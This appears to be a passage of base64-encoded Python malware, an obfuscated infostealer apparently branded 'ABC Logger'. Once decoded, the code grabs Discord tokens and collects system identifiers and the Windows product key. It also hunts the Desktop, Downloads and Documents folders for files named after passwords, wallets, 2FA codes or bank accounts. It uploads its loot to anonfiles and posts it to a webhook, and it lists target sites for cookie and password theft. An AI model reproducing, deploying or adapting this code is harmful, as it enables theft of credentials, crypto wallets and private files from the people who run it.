ubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgaWYgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxvZycpIGFuZCBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubGRiJyk6CiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAocidbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyN30nLCByJ21mYVwuW1x3LV17ODR9Jyk6CiAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwocmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgIHJldHVybiB0b2tlbnMKCiAgICBmb3IgcGxhdGZvcm0sIHBhdGggaW4gdG9rZW5wYXRocy5pdGVtcygpOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgdG9rZW5zID0gZmluZF90b2tlbnMocGF0aCkKCiAgICAgICAgaWYgbGVuKHRva2VucykgPiAwOgogICAgICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ3t0b2tlbn1cbicKICAgICAgICAgICAgICAgIHRva2VuX2NvdW50ID0gdG9rZW5fY291bnQgKyAxCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcGFzcwoKICAgIHdpdGggb3BlbigidG9rZW5zLnR4dCIsICJhIikgYXMgdG9rZW5zZmlsZToKICAgICAgICB0b2tlbnNmaWxlLndyaXRlKG1lc3NhZ2UpCgogICAgZmlsZV9wYXRoID0gInRva2Vucy50eHQiCiAgICBmaWxldXJsID0gdXBsb2FkVG9Bbm9uZmlsZXMoZmlsZV9wYXRoKQogICAgcmVxdWVzdHMucG9zdChob29rLCBqc29uPXsKICAgICAgICAgICAgICAiY29udGVudCI6ICJUb2tlbnMiLAogICAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJBQkMgPiBEaXNjb3JkIFRva2VucyIsCiAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiKipGb3VuZCBUb2tlbnMgSW46KipcblxuW0Rpc2NvcmQgQXBwXShodHRwczovL3d3dy5kaXNjb3JkLmNvbS8pIHwgW0Rpc2NvcmQgQ2FuYXJ5XShodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS9kb3dubG9hZC9jYW5hcnk/cGxhdGZvcm09d2luKSB8IFtEaXNjb3JkIFBUQl0oaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvZG93bmxvYWQvcHRiP3BsYXRmb3JtPXdpbikgIHwgW0Nocm9tZV0oaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9pbnRsL2VuX2llL2Nocm9tZS8pIHwgW09wZXJhXShodHRwczovL3d3dy5vcGVyYS5jb20vKSB8IFtCcmF2ZSBCcm93c2VyXShodHRwczovL2JyYXZlLmNvbS8pIHwgW1lhbmRleF0oaHR0cHM6Ly95YW5kZXguY29tLylcblxu8J+UkSAqKsK3IHt0b2tlbl9jb3VudH0qKiBUb2tlbnMgRm91bmRcbvCflJcgKirCtyoqIFtBQkNUb2tlbnMudHh0XSh7ZmlsZXVybH0pIiwKICAgICAgICAgICAgICAgICAgImNvbG9yIjogMTM5LAogICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkFCQyB8IEFyeGlmeSMwMDAxIgogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAidXNlcm5hbWUiOiAiQUJDIExvZ2dlciIsCiAgICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICAgICAgfSkKCmdyYWJfdG9rZW5zKCkKCgpkZWYgc2VuZF9zeXN0ZW1faW5mbygpOgogICAgcGNfbmFtZSA9IG9zLmdldGVudigiVVNFUk5BTUUiKQogICAgbm9kZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpCiAgICBvc25hbWUgPSBzdWJwcm9jZXNzLnJ1bignd21pYyBvcyBnZXQgQ2FwdGlvbicsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHNoZWxsPVRydWUpLnN0ZG91dC5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zdHJpcCgpLnNwbGl0bGluZXMoKVsyXS5zdHJpcCgpCiAgICBpcF9hZGRyID0gZ2V0aXAoKQogICAgbm9kZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpCgogICAgIyBsb2NhbCBpcAogICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgcy5jb25uZWN0KCgiOC44LjguOCIsIDgwKSkKICAgIGxvY2FsX2lwID0gcy5nZXRzb2NrbmFtZSgpWzBdCiAgICBzLmNsb3NlKCkKCiAgICBwcm9kdWN0X2tleSA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCd3bWljIHBhdGggc29mdHdhcmVsaWNlbnNpbmdzZXJ2aWNlIGdldCBPQTN4T3JpZ2luYWxQcm9kdWN0S2V5JykuZGVjb2RlKCkuc3BsaXQoJ1xuJylbMV0uc3RyaXAoKQogICAgaHdpZCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCJ3bWljIGNzcHJvZHVjdCBnZXQgdXVpZCIpLmRlY29kZSgpLnNwbGl0KCJcbiIpWzFdLnN0cmlwKCkKCiAgICAjIG1hYyBhZGRyZXNzCiAgICBpbnRlcmZhY2UsIGFkZHJzID0gbmV4dChpdGVyKHBzdXRpbC5uZXRfaWZfYWRkcnMoKS5pdGVtcygpKSkKICAgIG1hYyA9IGFkZHJzWzBdLmFkZHJlc3MKCiAgICAjcmFtCiAgICByYW0gPSBzdHIoaW50KGludChzdWJwcm9jZXNzLnJ1bignd21pYyBjb21wdXRlcnN5c3RlbSBnZXQgdG90YWxwaHlzaWNhbG1lbW9yeScsIGNhcHR1cmVfb3V0cHV0PVRydWUsCiAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlKS5zdGRvdXQuZGVjb2RlKGVycm9ycz0naWdub3JlJykuc3RyaXAoKS5zcGxpdCgpWzFdKSAvIDEwMDAwMDAwMDApKSArICJHQiIKCiAgICAjY2xvc2UKICAgIGdwdSA9IHN1YnByb2Nlc3MucnVuKCJ3bWljIHBhdGggd2luMzJfVmlkZW9Db250cm9sbGVyIGdldCBuYW1lIiwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgc2hlbGw9VHJ1ZSkuc3Rkb3V0LmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnNwbGl0bGluZXMoKVsyXS5zdHJpcCgpCiAgICBjcHUgPSBzdWJwcm9jZXNzLnJ1bihbIndtaWMiLCAiY3B1IiwgImdldCIsICJOYW1lIl0sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkuc3Rkb3V0LnN0cmlwKCkuc3BsaXQoJ1xuJylbMl0KCiAgICAKICAgIHJlcXVlc3RzLnBvc3QoaG9vaywganNvbj17CiAgICAgICJjb250ZW50IjogIkFyeGlmR3JhYmJlciB8IFN5c3RlbSBJbmZvIiwKICAgICAgImVtYmVkcyI6IFsKICAgICAgICB7CiAgICAgICAgICAidGl0bGUiOiAiQUJDID4gU3lzdGVtIEluZm9ybWF0aW9uIFN0ZWFsZXIiLAogICAgICAgICAgImRlc2NyaXB0aW9uIjogZiLwn5K7ICoqe3BjX25hbWV9Kipcblxu8J+SuyAqKlBDIFVzZXJuYW1lOioqIC0gYHtwY19uYW1lfWBcbvCflqUgKipQQyBOb2RlOioqIC0gYHtub2RlfWBcbvCfjJAgKipPUzoqKiAtIGB7b3NuYW1lfWBcblxu8J+MkCAqKklQOioqIC0gYHtpcF9hZGRyfWBcbvCfjY8gKipNQUM6KiogLSBge21hY31gXG7wn5SnICoqSFdJRDoqKiAtIGB7aHdpZH1gXG5cbvCfj7wgKipDUFU6KiogLSBge2NwdX1gXG7wn4+/ICoqR1BVOioqIC0gYHtncHV9YFxu8J+QjyAqKlJBTToqKiAtIGB7cmFtfWBcblxu8J+kkSAqKlByb2R1Y3QgS2V5OioqIC0gYHtwcm9kdWN0X2tleX1gXG7wn5alICoqTG9jYWwgSVA6KiogLSBge2xvY2FsX2lwfWAiLAogICAgICAgICAgImNvbG9yIjogMTM5LAogICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgInRleHQiOiAiQUJDIHwgQXJ4aWZ5IzAwMDEiCiAgICAgICAgICB9CiAgICAgICAgfQogICAgICBdLAogICAgICAidXNlcm5hbWUiOiAiQUJDIExvZ2dlciIsCiAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICB9KQoKc2VuZF9zeXN0ZW1faW5mbygpCgpkZWYgS2l3aUZvbGRlcihwYXRoRiwga2V5d29yZHMpOgogICAgZ2xvYmFsIEtpd2lGaWxlcwogICAgbWF4ZmlsZXNwZXJkaXIgPSA3CiAgICBpID0gMAogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aEYpCiAgICBmZm91bmQgPSBbXQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUocGF0aEYgKyAiLyIgKyBmaWxlKTogcmV0dXJuCiAgICAgICAgaSArPSAxCiAgICAgICAgaWYgaSA8PSBtYXhmaWxlc3BlcmRpcjoKICAgICAgICAgICAgdXJsID0gdXBsb2FkVG9Bbm9uZmlsZXMocGF0aEYgKyAiLyIgKyBmaWxlKQogICAgICAgICAgICBmZm91bmQuYXBwZW5kKFtwYXRoRiArICIvIiArIGZpbGUsIHVybF0pCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYnJlYWsKICAgIEtpd2lGaWxlcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoRiArICIvIiwgZmZvdW5kXSkKCktpd2lGaWxlcyA9IFtdCmRlZiBLaXdpRmlsZShwYXRoLCBrZXl3b3Jkcyk6CiAgICBnbG9iYWwgS2l3aUZpbGVzCiAgICBmaWZvdW5kID0gW10KICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGgpCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgIGZvciB3b3JmIGluIGtleXdvcmRzOgogICAgICAgICAgICBpZiB3b3JmIGluIGZpbGUubG93ZXIoKToKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHBhdGggKyAiLyIgKyBmaWxlKSBhbmQgIi50eHQiIGluIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgZmlmb3VuZC5hcHBlbmQoW3BhdGggKyAiLyIgKyBmaWxlLCB1cGxvYWRUb0Fub25maWxlcyhwYXRoICsgIi8iICsgZmlsZSldKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToKICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSBwYXRoICsgIi8iICsgZmlsZQogICAgICAgICAgICAgICAgICAgIEtpd2lGb2xkZXIodGFyZ2V0LCBrZXl3b3JkcykKICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgIEtpd2lGaWxlcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoLCBmaWZvdW5kXSkKCmRlZiBLaXdpKCk6CiAgICB1c2VyID0gdGVtcC5zcGxpdCgiXEFwcERhdGEiKVswXQogICAgcGF0aDJzZWFyY2ggPSBbCiAgICAgICAgdXNlciArICIvRGVza3RvcCIsCiAgICAgICAgdXNlciArICIvRG93bmxvYWRzIiwKICAgICAgICB1c2VyICsgIi9Eb2N1bWVudHMiCiAgICBdCgogICAga2V5X3dvcmRzRm9sZGVyID0gWwogICAgICAgICJhY2NvdW50IiwKICAgICAgICAiYWNvdW50IiwKICAgICAgICAicGFzc3ciLAogICAgICAgICJzZWNyZXQiCgogICAgXQoKICAgIGtleV93b3Jkc0ZpbGVzID0gWwogICAgICAgICJwYXNzdyIsCiAgICAgICAgIm1kcCIsCiAgICAgICAgIm1vdGRlcGFzc2UiLAogICAgICAgICJtb3RfZGVfcGFzc2UiLAogICAgICAgICJsb2dpbiIsCiAgICAgICAgInNlY3JldCIsCiAgICAgICAgImFjY291bnQiLAogICAgICAgICJhY291bnQiLAogICAgICAgICJwYXlwYWwiLAogICAgICAgICJiYW5xdWUiLAogICAgICAgICJhY2NvdW50IiwKICAgICAgICAibWV0YW1hc2siLAogICAgICAgICJ3YWxsZXQiLAogICAgICAgICJjcnlwdG8iLAogICAgICAgICJleG9kdXMiLAogICAgICAgICJkaXNjb3JkIiwKICAgICAgICAiMmZhIiwKICAgICAgICAiY29kZSIsCiAgICAgICAgIm1lbW8iLAogICAgICAgICJjb21wdGUiLAogICAgICAgICJ0b2tlbiIsCiAgICAgICAgImJhY2t1cCIsCiAgICAgICAgInNlZWNyZXQiCiAgICAgICAgXQoKICAgIHdpa2l0aCA9IFtdCiAgICBmb3IgcGF0dCBpbiBwYXRoMnNlYXJjaDoKICAgICAgICBraXdpID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9S2l3aUZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXSk7a2l3aS5zdGFydCgpCiAgICAgICAgd2lraXRoLmFwcGVuZChraXdpKQogICAgcmV0dXJuIHdpa2l0aAoKCmdsb2JhbCBrZXl3b3JkLCBjb29raVdvcmRzLCBwYXN3V29yZHMKCmtleXdvcmQgPSBbCiAgICAnbWFpbCcsICdbY29pbmJhc2VdKGh0dHBzOi8vY29pbmJhc2UuY29tKScsICdbc2VsbGl4XShodHRwczovL3NlbGxpeC5pbyknLCAnW2dtYWlsXShodHRwczovL2dtYWlsLmNvbSknLCAnW3N0ZWFtXShodHRwczovL3N0ZWFtLmNvbSknLCAnW2Rpc2NvcmRdKGh0dHBzOi8vZGlzY29yZC5jb20pJywgJ1tyaW90Z2FtZXNdKGh0dHBzOi8vcmlvdGdhbWVzLmNvbSknLCAnW3lvdXR1YmVdKGh0dHBzOi8veW91dHViZS5jb20pJywgJ1tpbnN0YWdyYW1dKGh0dHBzOi8vaW5zdGFncmFtLmNvbSknLCAnW3Rpa3Rva10oaHR0cHM6Ly90aWt0b2suY29tKScsICdbdHdpdHRlcl0oaHR0cHM6Ly90d2l0dGVyLmNvbSknLCAnW2ZhY2Vib29rXShodHRwczovL2ZhY2Vib29rLmNvbSknLCAnY2FyZCcsICdbZXBpY2dhbWVzXShodHRwczovL2VwaWNnYW1lcy5jb20pJywgJ1tzcG90aWZ5XShodHRwczovL3Nwb3RpZnkuY29tKScsICdbeWFob29dKGh0dHBzOi8veWFob28uY29tKScsICdbcm9ibG94XShodHRwczovL3JvYmxveC5jb20pJywgJ1t0d2l0Y2hdKGh0dHBzOi8vdHdpdGNoLmNvbSknLCAnW21pbmVjcmFmdF0oaHR0cHM6Ly9taW5lY3JhZnQubmV0KScsICdiYW5rJywgJ1twYXlwYWxdKGh0dHBzOi8vcGF5cGFsLmNvbSknLCAnW29yaWdpbl0oaHR0cHM6Ly9vcmlnaW4uY29tKScsICdbYW1hem9uXShodHRwczovL2FtYXpvbi5jb20pJywgJ1tlYmF5XShodHRwczovL2ViYXkuY29tKScsICdbYWxpZXhwcmVzc10oaHR0cHM6Ly9hbGlleHByZXNzLmNvbSknLCAnW3BsYXlzdGF0aW9uXShodHRwczovL3BsYXlzdGF0aW9uLmNvbSknLCAnW2hib10oaHR0cHM6Ly9oYm8uY29tKScsICdbeGJveF0oaHR0cHM6Ly94Ym94LmNvbSknLCAnYnV5JywgJ3NlbGwnLCAnW2JpbmFuY2VdKGh0dHBzOi8vYmluYW5jZS5jb20pJywgJ1tob3RtYWlsXShodHRwczovL2hvdG1haWwuY29tKScsICdbb3V0bG9va10oaHR0cHM6Ly9vdXRsb29rLmNvbSknLCAnW2NydW5jaHlyb2xsXShodHRwczovL2NydW5jaHlyb2xsLmNvbSknLCAnW3RlbGVncmFtXShodHRwczovL3RlbGVncmFtLmNvbSknLCAnW3Bvcm5odWJdKGh0dHBzOi8vcG9ybmh1Yi5jb20pJywgJ1tkaXNuZXldKGh0dHBzOi8vZGlzbmV5LmNvbSknLCAnW2V4cHJlc3N2cG5dKGh0dHBzOi8vZXhwcmVzc3Zwbi5jb20pJywgJ2NyeXB0bycsICdbdWJlcl0oaHR0cHM6Ly91YmVyLmNvbSknLCAnW25ldGZsaXhdKGh0dHBzOi8vbmV0ZmxpeC5jb20pJwpdCgoKY29va2lXb3JkcyA9IFtdCnBhc3dXb3JkcyA9IFtdCgpHYXRoZXJBbGwoKQpERVRFQ1RFRCA9IFRydXN0KENvb2tpZXMpCgppZiBub3QgREVURUNURUQ6CiAgICB3aWtpdGggPSBLaXdpKCkKCiAgICBmb3IgdGhyZWFkIGluIHdpa2l0aDogdGhyZWFkLmpvaW4oKQogICAgdGltZS5zbGVlcCgwLjIpCgogICAgZmlsZXRleHQgPSAiXG4iCiAgICBmb3IgYXJnIGluIEtpd2lGaWxlczoKICAgICAgICBpZiBsZW4oYXJnWzJdKSAhPSAwOgogICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXQogICAgICAgICAgICBmb2xkbGlzdCA9IGFyZ1syXQogICAgICAgICAgICBmaWxldGV4dCArPSBmIuKAoiB7Zm9sZHBhdGh9XG4iCgogICAgICAgICAgICBmb3IgZmZpbCBpbiBmb2xkbGlzdDoKICAgICAgICAgICAgICAgIGEgPSBmZmlsWzBdLnNwbGl0KCIvIikKICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0KICAgICAgICAgICAgICAgIGIgPSBmZmlsWzFdCiAgICAgICAgICAgICAgICBmaWxldGV4dCArPSBmIi4uLiBbe2ZpbGVhbm1lfV0oe2J9KVxuIgogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iCiAgICB1cGxvYWQoImtpd2kiLCBmaWxldGV4dCkK
"""
))
